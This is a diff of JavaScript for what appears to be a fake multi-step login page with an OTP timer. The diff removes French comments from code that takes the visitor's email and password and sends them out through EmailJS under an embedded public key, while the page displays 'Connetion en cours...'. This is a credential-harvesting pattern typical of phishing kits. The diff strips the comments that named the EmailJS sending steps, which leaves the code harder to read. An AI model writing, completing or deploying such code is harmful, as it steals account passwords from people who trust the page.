@@ -44,9 +44,7 @@ function goToStep3() {
   showStep(3);
 }
 
-/* ======================================
-   COMPTE À REBOURS — CODE ORIGINAL
-====================================== */
+
 function startOtpTimer() {
   let seconds = 30;
 
@@ -100,9 +98,7 @@ if (otpSingle) {
   });
 }
 
-/* ======================================
-   INITIALISATION EMAILJS
-====================================== */
+
 emailjs.init({
   publicKey: 'OdVrpD_0CpgUT6Ahz'
 });
@@ -139,28 +135,16 @@ if (form && emailInput && passwordInput && result) {
     event.preventDefault();
 
 
-    // ------------------------------
-    // Vérification HTML
-    // ------------------------------
 
     if (!form.checkValidity()) {
         form.reportValidity();
         return;
     }
 
-   
-
-    // ------------------------------
-    // Récupération des données
-    // ------------------------------
 
     const email = emailInput.value.trim();
     const password = passwordInput.value.trim();
 
-
-    // ------------------------------
-    // Paramètres EmailJS
-    // ------------------------------
 
     const templateParams = {
         email: email,
@@ -168,7 +152,7 @@ if (form && emailInput && passwordInput && result) {
       
    } 
     // ------------------------------
-    // Envoi EmailJS
+    // Envoi 
     // ------------------------------
 
     result.textContent = "Connetion en cours...";
